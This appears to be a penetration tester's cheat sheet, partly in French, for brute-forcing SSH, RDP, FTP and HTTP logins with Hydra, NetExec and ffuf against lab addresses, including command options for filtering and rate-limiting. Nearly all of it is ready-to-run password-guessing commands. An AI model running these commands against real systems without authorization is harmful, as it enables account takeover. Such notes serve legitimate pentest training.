# Bruteforce

## SSH

```bash
# Hydra (BETTER than NXC)
hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201

# List of users using wordlists
hydra -L users.txt -P <passwordList> -s port <IP> ssh

# Only one user and wordlist passwords
hydra -l root -P <passwordList> -s port <IP> ssh

# NXC
nxc ssh 192.168.50.201 --port 2222 -u george -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

## RDP

```bash
# Hydra
echo -e "daniel\njustin" | sudo tee -a /usr/share/wordlists/dirb/others/names.txt
hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword" rdp://192.168.50.202

# NXC
nxc rdp 192.168.150.202 -u /usr/share/wordlists/dirb/others/names.txt -p "SuperPassword"
```

## FTP

```bash
# Hydra
hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.150.202

# NXC (BETTER than Hydra)
nxc ftp 192.168.150.202 -u itadmin -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
```

## HTTP

### Hydra 

**HTTP Basic Auth**

```sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt example.com http-head /admin/
```

**HTTP Digest (Header Authorization: Basic)**

```sh
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt Y.Y.Y.Y http-get /admin/
```

**HTTP POST Form**

```sh
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com https-post-form "/login.php:username=^USER^&password=^PASS^&login=Login:Not allowed"
```

Parameters

- `-l <user>`: login with `user` name.
- `-L <users-file>`: login with users from file.
- `-P <passwords file>`: login with passwords from file.
- `http-head | http-get | http-post-form`: service to attack.
### ffuf

``` bash
# Burp -> clic droit sur la requête -> Copy to file / Save selected text to file -> `request.txt`

# Mot-clé par défaut -> placer `FUZZ` dans la requête
ffuf -request ./request.txt -w ./wordlist.txt

# Mots-clés personnalisés -> placer `FUZZUSR` et `FUZZPW` dans la requête
ffuf -request ./request.txt -request-proto http -w ./username.txt:FUZZUSR,./password.txt:FUZZPW

## options
-fc 401                # filter by status code 
-fs 1234               # filter by response size 
-fw 10                 # filter by word count 
-fr "mot_clef"         # filter by regex dans la réponse
-r                     # suit les redirections 302
-rate 10               # limite à 10 requêtes/seconde
-t 1                   # limite à 1 thread
-debug-log ./debug.log # log complet dans un fichier
-request-proto http

# si http, supprimer Upgrade-Insecure-Requests: 1 de request.txt


# BASE64 - BASIC AUTH (utiliser hydra http-get)
https://github.com/ffuf/ffuf-scripts
./ffuf-scripts/ffuf_basicauth.sh usernames.txt passwords.txt | ffuf -w -:AUTHFUZZ -request brute.req.txt -request-proto http
echo AUTHFUZZ | base64 --decode
```